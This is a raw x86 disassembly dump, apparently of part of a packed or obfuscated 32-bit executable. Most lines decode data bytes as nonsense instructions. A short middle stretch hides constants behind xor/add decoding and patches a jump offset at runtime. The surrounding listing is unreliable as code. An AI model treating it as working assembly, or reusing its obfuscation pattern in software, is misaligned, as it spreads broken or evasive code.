  41fcf5:	mov    ecx,0x3e1517a7
  41fcfa:	ds xchg edx,eax
  41fcfc:	xor    eax,0x6996a88e
  41fd01:	cmp    eax,0x7dc4d232
  41fd06:	ins    BYTE PTR es:[edi],dx
  41fd07:	jecxz  0x41fd7d
  41fd09:	out    dx,eax
  41fd0a:	cmp    edx,DWORD PTR [esi+esi*4+0x5e27a73a]
  41fd11:	fstp   st(0)
  41fd13:	loopne 0x41fd7d
  41fd15:	mov    eax,ds:0x242dfbeb
  41fd1a:	nop
  41fd1b:	mov    cl,0x35
  41fd1d:	mov    ah,0x28
  41fd1f:	dec    ebx
  41fd20:	mov    edx,0x229854b8
  41fd25:	and    esp,DWORD PTR [ebp+0x38]
  41fd28:	fadd   DWORD PTR [eax-0x2b]
  41fd2b:	sub    al,0xd3
  41fd2d:	out    dx,eax
  41fd2e:	retf   0xf7fd
  41fd31:	lds    eax,FWORD PTR [edx+edi*1-0xb]
  41fd35:	call   0x58e5:0xde37aa30
  41fd3c:	fsub   DWORD PTR [eax-0x1bdd379]
  41fd42:	test   al,0x74
  41fd44:	add    ah,BYTE PTR [ecx+0x22]
  41fd47:	or     BYTE PTR [edx+0x37],al
  41fd4a:	in     al,0x5e
  41fd4c:	pop    edx
  41fd4d:	adc    esp,edi
  41fd4f:	mov    ch,0x38
  41fd51:	fs pop es
  41fd53:	(bad)  
  41fd55:	out    0x16,al
  41fd57:	fimul  DWORD PTR [ecx]
  41fd59:	xchg   esp,eax
  41fd5a:	inc    ebx
  41fd5b:	aaa    
  41fd5c:	aas    
  41fd5d:	mov    ebx,0x79bdf85
  41fd62:	(bad)  
  41fd64:	xchg   ebx,eax
  41fd65:	(bad)  
  41fd66:	mov    al,0xef
  41fd68:	repnz in eax,dx
  41fd6a:	inc    eax
  41fd6b:	hlt    
  41fd6c:	xor    dl,BYTE PTR [esi-0x3f]
  41fd6f:	sub    al,0x79
  41fd71:	dec    edx
  41fd72:	push   ebx
  41fd73:	cmp    bl,BYTE PTR [ebx]
  41fd75:	imul   ebp,DWORD PTR [ebx],0xffffffde
  41fd78:	and    BYTE PTR [eax+0x1ce4310e],dl
  41fd7e:	jns    0x41fdd4
  41fd80:	push   ebx
  41fd81:	fiadd  WORD PTR [edi+0x7]
  41fd84:	fnsave [edx-0x2a]
  41fd87:	dec    ebp
  41fd88:	loop   0x41fd58
  41fd8a:	sub    edx,edx
  41fd8c:	sbb    BYTE PTR [edx],0x7c
  41fd8f:	pop    edx
  41fd90:	imul   esi,eax,0x8a322d72
  41fd96:	scas   eax,DWORD PTR es:[edi]
  41fd97:	push   ds
  41fd98:	bound  edi,QWORD PTR [esi-0x4f40c757]
  41fd9e:	inc    ecx
  41fd9f:	cmp    esi,DWORD PTR ds:0x716d6c99
  41fda5:	test   BYTE PTR [eax-0x2e],cl
  41fda8:	mov    bl,0xab
  41fdaa:	push   ebx
  41fdab:	outs   dx,DWORD PTR ds:[esi]
  41fdac:	mov    fs,edx
  41fdae:	loop   0x41fd7c
  41fdb0:	xchg   edx,eax
  41fdb1:	retf   0x52d0
  41fdb4:	out    0x12,al
  41fdb6:	push   cs
  41fdb7:	mov    edi,0x353862ac
  41fdbc:	mov    al,dh
  41fdbe:	adc    BYTE PTR [ebx+ebx*1+0x46],ah
  41fdc2:	mov    cl,ch
  41fdc4:	lea    esi,[ecx+0x2f087b9a]
  41fdca:	into   
  41fdcb:	jge    0x41fd57
  41fdcd:	jno    0x41fe45
  41fdcf:	sub    DWORD PTR [edi+eiz*4+0x6434f972],ecx
  41fdd6:	fldenv [edx+0x10]
  41fdd9:	addr16 pop ds
  41fddb:	(bad)  
  41fddc:	std    
  41fddd:	mov    esi,cs
  41fddf:	add    BYTE PTR [ecx+0xa6640a],0x42
  41fde6:	je     0x41fdcd
  41fde8:	add    edi,DWORD PTR [esi-0x7cb905dd]
  41fdee:	jecxz  0x41fe21
  41fdf0:	sbb    al,0x2c
  41fdf2:	and    eax,0xfeff7f3e
  41fdf7:	fcmovne st,st(4)
  41fdf9:	ret    0x229d
  41fdfc:	xchg   ebp,eax
  41fdfd:	adc    eax,0x9dde324e
  41fe02:	(bad)  
  41fe03:	jno    0x41fe1c
  41fe05:	fwait
  41fe06:	lds    ebx,FWORD PTR [edi-0x472612a3]
  41fe0c:	push   edi
  41fe0d:	dec    edi
  41fe0e:	iret   
  41fe0f:	stos   BYTE PTR es:[edi],al
  41fe10:	xor    DWORD PTR [ecx],ebp
  41fe12:	das    
  41fe13:	push   es
  41fe14:	andnps xmm5,XMMWORD PTR [ebx+0x341acb28]
  41fe1b:	sub    ah,cl
  41fe1d:	pop    edi
  41fe1e:	push   ebp
  41fe1f:	out    dx,al
  41fe20:	jnp    0x41fdff
  41fe22:	jp     0x41fde1
  41fe24:	cmp    al,0x3
  41fe26:	push   es
  41fe27:	and    eax,0x36f0069e
  41fe2c:	push   ebx
  41fe2d:	ss xchg ecx,eax
  41fe2f:	xor    edi,DWORD PTR [eax]
  41fe31:	or     ch,cl
  41fe33:	mov    dl,0x68
  41fe35:	aaa    
  41fe36:	call   0x93267b34
  41fe3b:	sbb    dh,BYTE PTR [esi]
  41fe3d:	mov    al,0xcb
  41fe3f:	push   esi
  41fe40:	cmc    
  41fe41:	out    dx,eax
  41fe42:	mov    ebp,0xe39841b9
  41fe47:	xchg   esi,eax
  41fe48:	cmp    eax,esi
  41fe4a:	mov    esi,0xf224b101
  41fe4f:	push   0x3bfbe5be
  41fe54:	fistp  WORD PTR [ebx]
  41fe56:	push   0x48
  41fe58:	loop   0x41fe2c
  41fe5a:	mov    cl,0xad
  41fe5c:	lahf   
  41fe5d:	inc    edx
  41fe5e:	js     0x41fe69
  41fe60:	mov    dl,0x3a
  41fe62:	push   edi
  41fe63:	mov    ebp,0x7bb9d1fc
  41fe68:	mov    edx,0x155ed024
  41fe6d:	cmp    DWORD PTR [ebx+eiz*8+0x58],esi
  41fe71:	das    
  41fe72:	retf   
  41fe73:	mov    ah,0xe
  41fe75:	cmp    DWORD PTR ds:0x4b191c80,ebp
  41fe7b:	cmp    eax,esi
  41fe7d:	sub    al,0x54
  41fe7f:	clc    
  41fe80:	ret    
  41fe81:	jmp    0xdbd02377
  41fe86:	ror    DWORD PTR [ecx-0x25ffbaaf],cl
  41fe8c:	icebp  
  41fe8d:	or     eax,0x56593277
  41fe92:	push   ebp
  41fe93:	mov    edx,ecx
  41fe95:	mov    bh,0xb1
  41fe97:	test   DWORD PTR [ecx],ebx
  41fe99:	xor    dh,BYTE PTR [eax+0x79]
  41fe9c:	mov    BYTE PTR [edi-0x74],al
  41fe9f:	mov    ebx,?
  41fea1:	leave  
  41fea2:	dec    ecx
  41fea3:	sbb    BYTE PTR [edi+ecx*4-0x2fc3a176],cl
  41feaa:	or     dl,0x5e
  41fead:	jbe    0x41fef3
  41feaf:	adc    eax,0xbea631e7
  41feb4:	and    dh,0x7c
  41feb7:	gs aad 0x43
  41feba:	ja     0x41fe9f
  41febc:	xchg   DWORD PTR [edi],ebp
  41febe:	nop
  41febf:	cmp    DWORD PTR [ecx+0x2a4c1192],esp
  41fec5:	loopne 0x41ff08
  41fec7:	jg     0x41febd
  41fec9:	push   edi
  41feca:	push   eax
  41fecb:	pop    eax
  41fecc:	xchg   edx,ecx
  41fece:	dec    ebx
  41fecf:	and    ecx,ebx
  41fed1:	or     al,0xb0
  41fed3:	adc    ah,BYTE PTR [edi]
  41fed5:	repnz loopne 0x41fe82
  41fed8:	or     al,0x1b
  41feda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fedb:	leave  
  41fedc:	call   0x96885f9b
  41fee1:	inc    esi
  41fee2:	inc    ebx
  41fee3:	xor    eax,0x14bc9647
  41fee8:	mov    ecx,DWORD PTR ds:0x77a766b8
  41feee:	xor    al,0xd7
  41fef0:	out    dx,eax
  41fef1:	je     0xbcf63c90
  41fef7:	fwait
  41fef8:	push   ss
  41fef9:	or     bh,BYTE PTR [edi-0x640816ba]
  41feff:	jo     0x41fe9f
  41ff01:	iret   
  41ff02:	cmc    
  41ff03:	or     edx,esi
  41ff05:	ds pop ebx
  41ff07:	hlt    
  41ff08:	jge    0x41ff3d
  41ff0a:	inc    eax
  41ff0b:	mov    ah,0x4
  41ff0d:	dec    ebx
  41ff0e:	jmp    FWORD PTR [edi+0x4a]
  41ff11:	xchg   BYTE PTR [edx+0x76],ah
  41ff14:	sti    
  41ff15:	outs   dx,BYTE PTR ds:[esi]
  41ff16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff17:	push   eax
  41ff18:	out    0x4f,eax
  41ff1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff1b:	push   ds
  41ff1c:	mov    ebp,DWORD PTR ds:0xfa703da6
  41ff22:	out    dx,eax
  41ff23:	pop    edx
  41ff24:	add    al,0x85
  41ff26:	push   edx
  41ff27:	jmp    0xf71bbe3a
  41ff2c:	jno    0x41ff7b
  41ff2e:	fldcw  WORD PTR [ecx+0x2d626f5d]
  41ff34:	mov    ecx,0x5e668bab
  41ff39:	sub    al,0x14
  41ff3b:	mov    edi,0xa201ebd2
  41ff40:	jge    0x41feef
  41ff42:	ret    
  41ff43:	enter  0xcc5b,0xcb
  41ff47:	jbe    0x41ff52
  41ff49:	inc    esp
  41ff4a:	push   0x928907b9
  41ff4f:	cmp    BYTE PTR [edi-0x6c],al
  41ff52:	xor    DWORD PTR [eax+edi*4],ecx
  41ff55:	pop    ds
  41ff56:	pop    es
  41ff57:	imul   edx,DWORD PTR [esi],0x6e7a92e3
  41ff5d:	shl    esi,1
  41ff5f:	les    esi,FWORD PTR [ecx+ebx*4+0x6f94f044]
  41ff66:	xchg   ebx,eax
  41ff67:	pusha  
  41ff68:	pop    edi
  41ff69:	test   DWORD PTR [edi+0x39ed32f2],edi
  41ff6f:	push   edx
  41ff70:	test   ebp,edi
  41ff72:	bnd jmp 0x41ffb6
  41ff75:	xchg   ecx,eax
  41ff76:	std    
  41ff77:	hlt    
  41ff78:	push   0x8414c7b9
  41ff7d:	out    0xc0,al
  41ff7f:	and    DWORD PTR [eax+0x33635ab2],0xffffff8d
  41ff86:	jno    0x41ff53
  41ff88:	push   ebp
  41ff89:	cmp    ah,BYTE PTR [edx]
  41ff8b:	enter  0x73ed,0xfc
  41ff8f:	in     al,dx
  41ff90:	jno    0x41ff5e
  41ff92:	stc    
  41ff93:	imul   edi,ebp,0xffffffcb
  41ff96:	(bad)
  41ff99:	inc    ebx
  41ff9a:	repz mov ah,0xfd
  41ff9d:	push   esi
  41ff9e:	sub    DWORD PTR [edx],edx
  41ffa0:	inc    eax
  41ffa1:	sub    al,0x10
  41ffa3:	data16 in al,0x31
  41ffa6:	mov    ds:0xd10e72ac,al
  41ffab:	xchg   esi,eax
  41ffac:	adc    ebp,DWORD PTR [ebp-0x76]
  41ffaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffb0:	jg     0x420015
  41ffb2:	test   al,0xc4
  41ffb4:	mov    DWORD PTR [edi-0x260bfc09],esp
  41ffba:	outs   dx,BYTE PTR ds:[esi]
  41ffbb:	aad    0xc8
  41ffbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffbe:	sub    ecx,DWORD PTR [esi]
  41ffc0:	mov    WORD PTR [ecx-0x77f73dc4],cs
  41ffc6:	out    0xbc,eax
  41ffc8:	out    dx,al
  41ffc9:	jb     0x41ffd5
  41ffcb:	out    0xc5,al
  41ffcd:	nop
  41ffce:	adc    DWORD PTR [eax+eax*1],ebp
  41ffd1:	mov    esp,0x5a8fb567
  41ffd6:	std    
  41ffd7:	aam    0xcf
  41ffd9:	aaa    
  41ffda:	pop    edx
  41ffdb:	arpl   WORD PTR [ebp+0x71ed0019],ax
  41ffe1:	dec    ecx
  41ffe2:	push   ds
  41ffe3:	sbb    al,0x8e
  41ffe5:	arpl   WORD PTR [eax-0x1f],bx
  41ffe8:	popf   
  41ffe9:	out    0xfe,eax
  41ffeb:	xchg   edi,eax
  41ffec:	enter  0x919a,0xf2
  41fff0:	push   es
  41fff1:	pop    esi
  41fff2:	jg     0x41ffa1
  41fff4:	ds test al,0xbb
  41fff7:	popa   
  41fff8:	cmp    al,0xfd
  41fffa:	mov    ecx,DWORD PTR [ebp-0x18]
  41fffd:	sub    eax,ecx
  41ffff:	mov    DWORD PTR [ebp-0x18],eax
  420002:	or     DWORD PTR [ebp-0x18],0xf89f05a5
  420009:	mov    eax,DWORD PTR [ebp-0xc]
  42000c:	mov    ecx,DWORD PTR [ebp-0xc]
  42000f:	sub    eax,ecx
  420011:	mov    DWORD PTR [ebp-0xc],eax
  420014:	or     DWORD PTR [ebp-0xc],0xf89c85e5
  42001b:	mov    eax,DWORD PTR [ebp-0x1c]
  42001e:	mov    ecx,DWORD PTR [ebp-0x1c]
  420021:	sub    eax,ecx
  420023:	mov    DWORD PTR [ebp-0x1c],eax
  420026:	or     DWORD PTR [ebp-0x1c],0xf89c8585
  42002d:	mov    eax,DWORD PTR [ebp-0x20]
  420030:	mov    ecx,DWORD PTR [ebp-0x20]
  420033:	sub    eax,ecx
  420035:	mov    DWORD PTR [ebp-0x20],eax
  420038:	mov    eax,DWORD PTR [ebp-0x2c]
  42003b:	mov    ecx,DWORD PTR [ebp-0x20]
  42003e:	mov    esi,0x75108ae
  420043:	xor    eax,esi
  420045:	mov    edi,0x3272f5
  42004a:	add    eax,edi
  42004c:	or     eax,ecx
  42004e:	mov    DWORD PTR [ebp-0x20],eax
  420051:	mov    eax,DWORD PTR [ebp-0x4]
  420054:	mov    ecx,DWORD PTR [ebp-0x4]
  420057:	sub    eax,ecx
  420059:	mov    DWORD PTR [ebp-0x4],eax
  42005c:	or     DWORD PTR [ebp-0x4],0xf89c85be
  420063:	mov    eax,DWORD PTR [ebp-0xc]
  420066:	xor    eax,esi
  420068:	add    eax,edi
  42006a:	push   eax
  42006b:	mov    eax,DWORD PTR [ebp-0x10]
  42006e:	xor    eax,esi
  420070:	add    eax,edi
  420072:	push   eax
  420073:	mov    eax,DWORD PTR [ebp-0x4]
  420076:	xor    eax,esi
  420078:	add    eax,edi
  42007a:	push   eax
  42007b:	lea    eax,[ebp-0x78]
  42007e:	push   eax
  42007f:	push   DWORD PTR [ebp-0x2c]
  420082:	push   DWORD PTR [ebp-0x28]
  420085:	call   0x40f76f
  42008a:	test   eax,eax
  42008c:	je     0x4200ba
  420092:	lea    eax,[ebp-0x78]
  420095:	push   eax
  420096:	mov    eax,DWORD PTR [ebp-0x28]
  420099:	xor    eax,esi
  42009b:	add    eax,edi
  42009d:	push   eax
  42009e:	mov    eax,DWORD PTR [ebp-0x24]
  4200a1:	add    eax,0xaa
  4200a6:	push   eax
  4200a7:	mov    eax,DWORD PTR [ebp-0x24]
  4200aa:	mov    eax,DWORD PTR [eax+0x198]
  4200b0:	push   DWORD PTR [eax]
  4200b2:	call   0x4061fa
  4200b7:	mov    DWORD PTR [ebp-0x14],eax
  4200ba:	mov    ecx,DWORD PTR ds:0x42a56a
  4200c0:	lea    eax,[ebp+0x4]
  4200c3:	mov    DWORD PTR [ecx*4+0x42a562],eax
  4200ca:	inc    DWORD PTR ds:0x42a56a
  4200d0:	mov    eax,DWORD PTR [ebp-0x14]
  4200d3:	test   eax,eax
  4200d5:	je     0x4224ce
  4200db:	lea    eax,[ebp-0x8]
  4200de:	mov    DWORD PTR [ebp-0x34],eax
  4200e1:	mov    eax,DWORD PTR [ebp-0x30]
  4200e4:	mov    DWORD PTR [ebp-0x8],eax
  4200e7:	mov    eax,DWORD PTR [ebp-0x8]
  4200ea:	mov    ecx,DWORD PTR [ebp-0x14]
  4200ed:	sub    eax,ecx
  4200ef:	mov    DWORD PTR [ebp-0x8],eax
  4200f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4200f5:	xor    ecx,esi
  4200f7:	mov    eax,0xffcd8d0b
  4200fc:	sub    eax,ecx
  4200fe:	add    DWORD PTR [ebp-0x8],eax
  420101:	mov    eax,DWORD PTR [ebp-0x8]
  420104:	mov    ecx,DWORD PTR [ebp-0x14]
  420107:	mov    DWORD PTR [ecx+0x1],eax
  42010a:	mov    eax,DWORD PTR [ebp-0x14]
  42010d:	jmp    0x42249e
  420112:	adc    ebp,DWORD PTR [ebx]
  420114:	inc    BYTE PTR [eax-0x2a]
  420117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420118:	xchg   ecx,eax
  420119:	or     dh,bh
  42011b:	lahf   
  42011c:	cmp    eax,0x8596b50a
  420121:	mov    ah,0x6
  420123:	mov    dh,0x80
  420125:	or     DWORD PTR [edi],0x5e
  420128:	add    DWORD PTR [ebx-0x50ab00e0],0xffffffc2
  42012f:	dec    esi
  420130:	imul   edx,esi,0x672de1e2
  420136:	push   eax
  420137:	mov    dl,0x19
  420139:	int3   
  42013a:	dec    DWORD PTR [edi-0x71]
  42013d:	jl     0x420183
  42013f:	data16 (bad) 
  420141:	pushf  
  420142:	pop    ss
  420143:	icebp  
  420144:	lock add BYTE PTR [eax+edi*8-0x39dab6dc],dh
  42014c:	xor    eax,0x3cdb984a
  420151:	dec    ecx
  420152:	push   es
  420153:	std    
  420154:	std    
  420155:	and    ch,al
  420157:	cs enter 0xa0aa,0x5a
  42015c:	add    al,dh
  42015e:	cmc    
  42015f:	cmp    al,0x6e
  420161:	lds    ebp,FWORD PTR [esi]
  420163:	pop    es
  420164:	mov    ch,cl
  420166:	pop    bx
  420168:	dec    esp
  420169:	mov    ecx,0x5ded89de
  42016e:	repz aam 0xe2
  420171:	adc    ah,BYTE PTR [ebx]
  420173:	push   edx
  420174:	add    al,0x96
  420176:	mov    eax,ds:0xdfad20a1
  42017b:	dec    edi
  42017c:	into   
  42017d:	loopne 0x4201f5
  42017f:	mov    ds:0xe8078349,eax
  420184:	mov    bl,0x54
  420186:	rcr    BYTE PTR [ebx-0x1ac459e4],cl
  42018c:	add    eax,0x415de55a
  420191:	add    al,0xe8
  420193:	ret    
  420194:	inc    ebp
  420195:	pusha  
  420196:	jne    0x42011e
  420198:	push   0xffffffad
  42019a:	sub    al,0x5a
  42019c:	test   al,0xcf
  42019e:	nop
  42019f:	mov    BYTE PTR [edi+ecx*2],ch
  4201a2:	adc    bl,BYTE PTR [ebx-0x35]
  4201a5:	data16 int3 
  4201a7:	sbb    DWORD PTR [ebx-0x2e],0xd13f5e2e
  4201ae:	out    0x58,eax
  4201b0:	test   BYTE PTR [ecx],ah
  4201b2:	fs cdq 
  4201b4:	jg     0x42016e
  4201b6:	mov    ds:0xb3cf8a93,eax
  4201bb:	jns    0x4201ef
  4201bd:	icebp  
  4201be:	scas   al,BYTE PTR es:[edi]
  4201bf:	dec    BYTE PTR [esi]
  4201c1:	mov    edi,0xd6c8db2c
  4201c6:	es xchg edi,eax
  4201c8:	lods   al,BYTE PTR ds:[esi]
  4201c9:	ss repz pop ebp
  4201cc:	xchg   ebx,eax
  4201cd:	fwait
  4201ce:	push   esp
  4201cf:	jno    0x42018f
  4201d1:	and    al,0xe
  4201d3:	adc    ch,bh
  4201d5:	mov    DWORD PTR [eax+0x352af605],ebp
  4201db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201dc:	push   ebp
  4201dd:	jg     0x420235
  4201df:	push   ebp
  4201e0:	(bad)  
  4201e1:	sub    eax,0xc1ecfd77
  4201e6:	mov    ecx,ecx
  4201e8:	clc    
  4201e9:	or     edx,DWORD PTR [ecx+0x75]
  4201ec:	aad    0x2d
  4201ee:	inc    esi
  4201ef:	std    
  4201f0:	push   ebp
  4201f1:	scas   al,BYTE PTR es:[edi]
  4201f2:	xchg   esi,eax
  4201f3:	sbb    DWORD PTR [edx+ebp*1-0x1ec94243],eax
  4201fa:	push   0x41
  4201fc:	fistp  QWORD PTR [esi]
  4201fe:	mov    edi,0xfd3b627b
  420203:	inc    esi
  420204:	mov    ah,0x6c
  420206:	lahf   
  420207:	pop    es
  420208:	dec    ebx
  420209:	push   ds
  42020a:	lea    edx,[eax-0x6b]
  42020d:	out    dx,eax
  42020e:	cmp    esp,DWORD PTR [eax-0x63]
  420211:	aaa    
  420212:	pop    edi
  420213:	stos   DWORD PTR es:[edi],eax
  420214:	int    0xa4
  420216:	jmp    0x9a8:0x3333feef
  42021d:	outs   dx,DWORD PTR ds:[esi]
  42021e:	jmp    0x4201ab
  420220:	icebp  
  420221:	jae    0x4201cb
  420223:	mov    eax,0x4bbed521
  420228:	xchg   ebp,eax
  420229:	icebp  
  42022a:	es dec ebp
  42022c:	adc    eax,0x41921e0a
  420231:	loopne 0x4201e9
  420233:	shl    DWORD PTR [eax-0x80],0x96
  420237:	pushf  
  420238:	in     eax,0xe5
  42023a:	fidiv  WORD PTR [ecx+0x35]
  42023d:	mov    ebx,0x7b0e34bf
  420242:	(bad)  
  420243:	mov    dh,0x35
  420245:	inc    esi
  420246:	gs (bad) 
  420248:	iret   
  420249:	push   ebp
  42024a:	sbb    ebx,DWORD PTR [ebp+0x0]
  42024d:	fimul  WORD PTR [ecx+ebx*8-0x78a24e44]
  420254:	push   ds
  420255:	repnz out 0x30,eax
  420258:	pop    ds
  420259:	pop    eax
  42025a:	mov    ds:0xeca5a9bb,al
  42025f:	test   eax,0xf3870dc6
  420264:	test   DWORD PTR [esi-0x26aaf815],ebx
  42026a:	ficom  WORD PTR [ebp-0xf]
  42026d:	cld    
  42026e:	dec    ebx
  42026f:	xor    eax,0x872c96fe
  420274:	pop    ss
  420275:	jnp    0x420286
  420277:	mov    edx,0xb7614f7e
  42027c:	shr    bl,0x58
  42027f:	dec    ecx
  420280:	pop    esi
  420281:	pop    eax
  420282:	rol    BYTE PTR [ebp-0x2b],1
  420285:	loope  0x420270
  420287:	xchg   edx,eax
  420288:	push   0x33
  42028a:	fcom   DWORD PTR [edi-0x55049456]
  420290:	xor    bh,dh
  420292:	push   esp
  420293:	ror    bl,0xc1
  420296:	sti    
  420297:	mov    ch,0xdb
  420299:	fdiv   QWORD PTR [edx+0x1b]
  42029c:	mov    ah,0x68
  42029e:	xchg   BYTE PTR [ebp+0x2f6141e],cl
  4202a4:	mov    dl,0xc3
  4202a6:	inc    ebp
  4202a7:	adc    DWORD PTR [edi+0x5d],ebp
  4202aa:	mov    ch,0x25
  4202ac:	ins    DWORD PTR es:[edi],dx
  4202ad:	adc    BYTE PTR [edx],0xd8
  4202b0:	(bad)  
  4202b1:	mov    esp,DWORD PTR [eax-0xc]
  4202b4:	aam    0xfc
  4202b6:	aaa    
  4202b7:	jbe    0x420262
  4202b9:	push   edi
  4202ba:	mov    ds:0x86a5aec,eax
  4202bf:	or     bl,dl
  4202c1:	xor    DWORD PTR es:[esi+eiz*4],0x5d
  4202c6:	push   eax
  4202c7:	jo     0x4202ab
  4202c9:	push   0x6121f15f
  4202ce:	pop    ds
  4202cf:	je     0x420286
  4202d1:	mov    cl,0x5b
  4202d3:	arpl   WORD PTR [ebp+0x69],di
  4202d6:	sbb    al,0x58
  4202d8:	js     0x420338
  4202da:	mov    WORD PTR [ecx+0x548142e3],?
  4202e0:	js     0x420316
  4202e2:	dec    ebx
  4202e3:	push   cs
  4202e4:	dec    eax
  4202e5:	dec    ebp
  4202e6:	dec    eax
  4202e7:	add    al,0x25
  4202e9:	push   ebp
  4202ea:	pop    ebx
  4202eb:	dec    eax
  4202ec:	std    
  4202ed:	test   BYTE PTR [esi],0x52
  4202f0:	adc    esp,edx
  4202f2:	mov    DWORD PTR [ebx+0x823ba9f],ecx
  4202f8:	or     BYTE PTR [ebp-0x26],ah
  4202fb:	or     eax,0xea272e89
  420300:	push   edi
  420301:	es es leave 
  420304:	mov    ds:0xdcff3a16,eax
  420309:	bound  edx,QWORD PTR ds:0xb403ac83
  42030f:	stc    
  420310:	or     eax,eax
  420312:	jmp    DWORD PTR [ebx-0x65a22cad]
  420318:	leave  
  420319:	pop    eax
  42031a:	(bad)  
  42031b:	in     al,0xa9
  42031d:	inc    edx
  42031e:	std    
  42031f:	adc    esi,DWORD PTR [ecx-0x7]
  420322:	jmp    0xbd25:0x3014e5cc
  420329:	not    BYTE PTR [ecx-0x6f4748c7]
  42032f:	fist   WORD PTR [ebp-0x7ca3bc9a]
  420335:	clc    
  420336:	out    0xc5,eax
  420338:	cdq    
  420339:	data16 stos BYTE PTR es:[edi],al
  42033b:	push   ecx
  42033c:	mov    al,ds:0x199a0763
  420341:	call   0xe38ea871
  420346:	fdivr  st,st(7)
  420348:	bound  ecx,QWORD PTR [eax+0xb]
  42034b:	xlat   BYTE PTR ds:[ebx]
  42034c:	cld    
  42034d:	sub    ebp,ebx
  42034f:	sub    eax,0xa9edbff8
  420354:	ficomp DWORD PTR [ebx]
  420356:	sub    eax,0x5a7dcd0
  42035b:	shr    dh,cl
  42035d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42035e:	test   eax,0xcbe21dca
  420363:	shr    DWORD PTR [ebp+eiz*8+0x59b989f5],0xaa
  42036b:	cmp    ebp,DWORD PTR [ecx-0x5b]
  42036e:	fidiv  WORD PTR [esi+0x66]
  420371:	sub    al,0x23
  420373:	or     al,0x4b
  420375:	ja     0x42035b
  420377:	into   
  420378:	out    0x49,al
  42037a:	loopne 0x420354
  42037c:	inc    ebx
  42037d:	std    
  42037e:	add    DWORD PTR [esi-0x65],esp
  420381:	iret   
  420382:	cmp    DWORD PTR [ebx+ebp*2-0x2de1b57b],0x16
  42038a:	mov    ds,WORD PTR [esi]
  42038c:	xchg   ebx,eax
  42038d:	lahf   
  42038e:	jl     0x42033a
  420390:	nop
  420391:	fst    st(4)
  420393:	adc    al,0x8f
  420395:	jp     0x4203f7
  420397:	jne    0x420357
  420399:	test   eax,0x28f13263
  42039e:	in     eax,0xe0
  4203a0:	sub    eax,0xf532d07d
  4203a5:	push   es
  4203a6:	aad    0x97
  4203a8:	lods   al,BYTE PTR ds:[si]
  4203aa:	jne    0x420347
  4203ac:	test   al,0x77
  4203ae:	adc    eax,0x2a17afe4
  4203b3:	jne    0x420412
  4203b5:	cmp    al,0x4b
  4203b7:	(bad)  
  4203b8:	stos   DWORD PTR es:[edi],eax
  4203b9:	or     al,al
  4203bb:	or     BYTE PTR [esi+0x3a],dl
  4203be:	test   BYTE PTR [edi-0x66781a9c],0xf
  4203c5:	sub    eax,0x1ea5d3dd
  4203ca:	xlat   BYTE PTR ds:[ebx]
  4203cb:	inc    esp
  4203cc:	add    esi,DWORD PTR [edx]
  4203ce:	dec    ebx
  4203cf:	call   0x8166e51e
  4203d4:	fdivr  QWORD PTR fs:[ebp+0x3f]
  4203d8:	mov    ch,BYTE PTR [ecx-0x55]
  4203db:	ror    DWORD PTR ds:0x2e88e17b,cl
  4203e1:	in     eax,0x5a
  4203e3:	aam    0x2e
  4203e5:	das    
  4203e6:	sahf   
  4203e7:	std    
  4203e8:	jl     0x4203eb
  4203ea:	jmp    0xd7221dcc
  4203ef:	retf   
  4203f0:	ins    BYTE PTR es:[edi],dx
  4203f1:	sub    DWORD PTR [esi+0x75],esp
  4203f4:	retf   0xe8d1
  4203f7:	inc    eax
  4203f8:	ins    BYTE PTR es:[edi],dx
  4203f9:	in     al,dx
  4203fa:	pusha  
  4203fb:	jmp    0x951ff068
  420400:	sbb    al,BYTE PTR [edx]
  420402:	mov    dl,0x2b
  420404:	mov    ch,0xd2
  420406:	fwait
  420407:	dec    esp
  420408:	ror    DWORD PTR [ecx],cl
  42040a:	rcl    DWORD PTR [edx+esi*2+0x4f],0x64
  42040f:	and    ebp,DWORD PTR [edx+esi*1]
  420412:	push   ebp
  420413:	push   ecx
  420414:	je     0x420397
  420416:	jmp    0xe9dd876
  42041b:	js     0x4203f2
  42041d:	(bad)  
  42041e:	sbb    BYTE PTR [ebx+0x44c56b6f],bh
  420424:	leave  
  420425:	dec    esi
  420426:	dec    edi
  420427:	mov    ah,0x62
  420429:	inc    eax
  42042a:	push   esp
  42042b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42042c:	xor    al,BYTE PTR [esi]
  42042e:	mov    bl,0x36
  420430:	mov    ebx,0x87edfb63
  420435:	push   ebp
  420436:	icebp  
  420437:	daa    
  420438:	add    al,0xc0
  42043a:	push   0x78d9bfe8
  42043f:	inc    esi
  420440:	loop   0x420469
  420442:	adc    al,0x82
  420444:	outs   dx,BYTE PTR ds:[esi]
  420445:	js     0x42049f
  420447:	adc    al,0x2a
  420449:	jge    0x420430
  42044b:	aad    0x58
  42044d:	ficomp DWORD PTR [edi+0x6deb57b3]
  420453:	sbb    ebp,DWORD PTR [esi+0x17]
  420456:	jmp    0x4204ba
  420458:	adc    al,0xf1
  42045a:	scas   eax,DWORD PTR es:[edi]
  42045b:	inc    ebx
  42045c:	or     ebx,DWORD PTR [ecx-0x21]
  42045f:	jo     0x420465
  420461:	mov    ds:0x13fa0d72,eax
  420466:	xchg   DWORD PTR [eax],edx
  420468:	dec    esp
  420469:	mov    ds:0x7356c082,eax
  42046e:	or     dl,BYTE PTR [edx+0x2d]
  420471:	imul   esi,DWORD PTR [esi+0x2fb5287d],0x542e37dd
  42047b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42047c:	rol    DWORD PTR [ecx],0x32
  42047f:	icebp  
  420480:	add    DWORD PTR [esi],edi
  420482:	loope  0x42040f
  420484:	bound  esi,QWORD PTR [esi+0x69e39e7d]
  42048a:	sar    DWORD PTR [esi+0x6b],cl
  42048d:	lods   al,BYTE PTR ds:[esi]
  42048e:	nop
  42048f:	pop    ebp
  420490:	inc    esp
  420491:	ret    0x9086
  420494:	loopne 0x420473
  420496:	pusha  
  420497:	mov    gs,WORD PTR [ecx+eax*4]
  42049a:	fcom   QWORD PTR [eax-0x1b76e4b7]
